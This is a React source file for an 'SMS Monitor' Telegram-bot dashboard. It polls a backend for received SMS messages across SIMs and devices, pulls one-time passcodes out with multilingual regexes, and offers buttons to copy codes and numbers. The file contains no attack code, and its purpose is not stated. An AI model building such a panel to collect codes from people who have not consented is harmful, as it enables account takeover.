import { useEffect, useState } from "react";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

interface SmsRow {
  timestamp: string;
  sim: string;
  phone: string;
  device: string;
  plan: string;
  body: string;
  isOtp: boolean;
}

interface Stats {
  totalRecords: string;
  totalDisplayed: string;
  otpCount: number;
  recent: SmsRow[];
  lastUpdated: string;
}

function useStats() {
  const [stats, setStats] = useState<Stats | null>(null);
  const [error, setError] = useState(false);
  const [tick, setTick] = useState(0);

  const fetchStats = async () => {
    try {
      const res = await fetch(`${BASE}/api/sms-stats`);
      if (!res.ok) throw new Error("Failed");
      setStats(await res.json());
      setError(false);
      setTick((t) => t + 1);
    } catch {
      setError(true);
    }
  };

  useEffect(() => {
    fetchStats();
    const id = setInterval(fetchStats, 5000);
    return () => clearInterval(id);
  }, []);

  return { stats, error, tick };
}

function extractOtp(text: string): string | null {
  const patterns = [
    /(?:OTP|otp|code|رمز|کد|verification|verify|confirm|auth|pin|passcode|пароль|код|senha)[^0-9]*(\d{4,8})/i,
    /(\d{4,8})[^0-9]*(?:OTP|otp|code|کد|رمز|verify|confirm|пароль|код)/i,
    /(?:is|:|-|=)\s*(\d{6})\b/,
    /(?<!\d)(\d{6})(?!\d)/,
    /(?<!\d)(\d{4})(?!\d)/,
  ];
  for (const p of patterns) {
    const m = text.match(p);
    if (m?.[1]) return m[1];
  }
  return null;
}

function timeAgo(ts: string): string {
  const diff = Math.floor((Date.now() - new Date(ts).getTime()) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  return `${Math.floor(diff / 3600)}h ago`;
}

function formatTime(ts: string) {
  return ts.replace("T", " ").substring(0, 19);
}

function CopyButton({ label, value }: { label: string; value: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button
      onClick={copy}
      className={`flex items-center gap-1.5 text-[11px] font-medium px-3 py-1.5 rounded-lg border transition-all duration-200 ${
        copied
          ? "bg-emerald-500/20 border-emerald-500/30 text-emerald-400"
          : "bg-white/5 border-white/10 text-white/50 hover:bg-white/10 hover:text-white/70"
      }`}
    >
      {copied ? (
        <>
          <svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
          </svg>
          Copied
        </>
      ) : (
        <>
          <svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <rect x="9" y="9" width="13" height="13" rx="2" />
            <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
          </svg>
          {label}
        </>
      )}
    </button>
  );
}

export default function App() {
  const { stats, error } = useStats();
  const [filter, setFilter] = useState<"all" | "otp" | "sms">("all");

  const filtered = (stats?.recent ?? []).filter((r) =>
    filter === "all" ? true : filter === "otp" ? r.isOtp : !r.isOtp
  );

  return (
    <div className="min-h-screen bg-[#07070d] text-white" style={{ fontFamily: "'Inter', system-ui, sans-serif" }}>

      {/* ── Top Nav ── */}
      <nav className="sticky top-0 z-50 border-b border-white/[0.06] bg-[#07070d]/90 backdrop-blur-xl">
        <div className="max-w-4xl mx-auto px-5 h-14 flex items-center justify-between">
          {/* Logo */}
          <div className="flex items-center gap-3">
            <div className="relative w-8 h-8">
              <div className="absolute inset-0 rounded-lg bg-gradient-to-br from-violet-500 to-indigo-600 opacity-20 blur-sm" />
              <div className="relative w-8 h-8 rounded-lg bg-gradient-to-br from-violet-500/80 to-indigo-600/80 flex items-center justify-center border border-violet-400/20">
                <svg className="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
                </svg>
              </div>
            </div>
            <div>
              <div className="text-sm font-semibold tracking-tight text-white">SMS Monitor</div>
              <div className="text-[10px] text-white/30 -mt-0.5 tracking-wide uppercase">Telegram Bot</div>
            </div>
          </div>

          {/* Status pill */}
          <div className={`flex items-center gap-2 text-xs font-medium px-3 py-1.5 rounded-full border ${
            error
              ? "bg-red-500/10 border-red-500/20 text-red-400"
              : "bg-emerald-500/10 border-emerald-500/20 text-emerald-400"
          }`}>
            <span className={`w-1.5 h-1.5 rounded-full ${error ? "bg-red-400" : "bg-emerald-400 animate-pulse"}`} />
            {error ? "Offline" : "Live"}
          </div>
        </div>
      </nav>

      <main className="max-w-4xl mx-auto px-5 py-8 space-y-6">

        {/* ── Stat Cards ── */}
        <div className="grid grid-cols-3 gap-3">
          {[
            {
              label: "Total SMS",
              value: stats?.totalRecords ?? "—",
              icon: (
                <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75" />
                </svg>
              ),
              accent: "from-blue-500/[0.08] to-blue-600/[0.04] border-blue-500/[0.12]",
              iconBg: "bg-blue-500/15 text-blue-400",
              textColor: "text-blue-300",
            },
            {
              label: "OTPs Detected",
              value: stats?.otpCount != null ? String(stats.otpCount) : "—",
              icon: (
                <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
                </svg>
              ),
              accent: "from-violet-500/[0.08] to-violet-600/[0.04] border-violet-500/[0.12]",
              iconBg: "bg-violet-500/15 text-violet-400",
              textColor: "text-violet-300",
            },
            {
              label: "Bot Status",
              value: error ? "Offline" : "Online",
              icon: (
                <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
                </svg>
              ),
              accent: error
                ? "from-red-500/[0.08] to-red-600/[0.04] border-red-500/[0.12]"
                : "from-emerald-500/[0.08] to-emerald-600/[0.04] border-emerald-500/[0.12]",
              iconBg: error ? "bg-red-500/15 text-red-400" : "bg-emerald-500/15 text-emerald-400",
              textColor: error ? "text-red-300" : "text-emerald-300",
            },
          ].map((card) => (
            <div key={card.label} className={`rounded-2xl border bg-gradient-to-br ${card.accent} p-4`}>
              <div className={`w-8 h-8 rounded-lg ${card.iconBg} flex items-center justify-center mb-3`}>
                {card.icon}
              </div>
              <div className={`text-2xl font-bold tracking-tight ${card.textColor}`}>{card.value}</div>
              <div className="text-xs text-white/30 mt-0.5">{card.label}</div>
            </div>
          ))}
        </div>

        {/* ── Messages Feed ── */}
        <div className="rounded-2xl border border-white/[0.06] bg-[#0c0c15] overflow-hidden">
          {/* Header */}
          <div className="px-5 py-4 border-b border-white/[0.06] flex items-center justify-between">
            <div className="flex items-center gap-3">
              <h2 className="text-sm font-semibold text-white/80">Recent Messages</h2>
              {stats && (
                <span className="text-[10px] text-white/20">
                  updated {formatTime(stats.lastUpdated)}
                </span>
              )}
            </div>

            {/* Filter tabs */}
            <div className="flex items-center gap-1 bg-white/[0.04] rounded-lg p-1">
              {(["all", "otp", "sms"] as const).map((f) => (
                <button
                  key={f}
                  onClick={() => setFilter(f)}
                  className={`text-[11px] font-medium px-2.5 py-1 rounded-md transition-all ${
                    filter === f
                      ? "bg-white/10 text-white"
                      : "text-white/30 hover:text-white/50"
                  }`}
                >
                  {f === "all" ? "All" : f === "otp" ? "⚡ OTP" : "📨 SMS"}
                </button>
              ))}
            </div>
          </div>

          {/* List */}
          {!stats ? (
            <div className="flex items-center justify-center py-16 gap-2 text-white/20 text-sm">
              <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
              </svg>
              Loading...
            </div>
          ) : filtered.length === 0 ? (
            <div className="py-16 text-center text-white/20 text-sm">No messages yet</div>
          ) : (
            <div className="divide-y divide-white/[0.04]">
              {filtered.map((row, i) => {
                const otp = row.isOtp ? extractOtp(row.body) : null;
                return (
                  <div key={i} className="px-5 py-4 hover:bg-white/[0.02] transition-colors group">
                    <div className="flex items-start gap-4">
                      {/* Icon */}
                      <div className={`mt-0.5 w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${
                        row.isOtp ? "bg-violet-500/15" : "bg-blue-500/10"
                      }`}>
                        {row.isOtp ? (
                          <svg className="w-3.5 h-3.5 text-violet-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
                          </svg>
                        ) : (
                          <svg className="w-3.5 h-3.5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75" />
                          </svg>
                        )}
                      </div>

                      {/* Content */}
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1">
                          <span className={`text-[10px] font-semibold uppercase tracking-wider ${
                            row.isOtp ? "text-violet-400" : "text-blue-400"
                          }`}>
                            {row.isOtp ? "OTP" : "SMS"}
                          </span>
                          <span className="text-white/20">·</span>
                          <span className="text-xs font-mono text-white/60">{row.phone}</span>
                          <span className="text-white/20">·</span>
                          <span className="text-[11px] text-white/25">{formatTime(row.timestamp)}</span>
                        </div>

                        {/* OTP highlight */}
                        {otp && (
                          <div className="mb-2 inline-flex items-center gap-2 bg-violet-500/10 border border-violet-500/20 rounded-lg px-3 py-1.5">
                            <span className="text-[10px] text-violet-400/70 font-medium uppercase tracking-wider">OTP</span>
                            <span className="text-lg font-bold text-violet-300 tracking-widest font-mono">{otp}</span>
                          </div>
                        )}

                        <p className="text-[13px] text-white/40 leading-relaxed break-all line-clamp-2">{row.body}</p>

                        <div className="flex items-center gap-1.5 mt-1 text-[10px] text-white/20">
                          <span>{row.sim}</span>
                          <span>·</span>
                          <span>{row.device}</span>
                          <span>·</span>
                          <span>{row.plan}</span>
                        </div>
                      </div>

                      {/* Actions */}
                      <div className="flex flex-col gap-1.5 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity">
                        {otp && <CopyButton label="OTP" value={otp} />}
                        <CopyButton label="Number" value={row.phone} />
                        <CopyButton label="Message" value={row.body} />
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* ── Footer ── */}
        <div className="text-center text-[11px] text-white/15 pb-4">
          Auto-refreshes every 5 seconds · SMS Monitor Bot
        </div>
      </main>
    </div>
  );
}
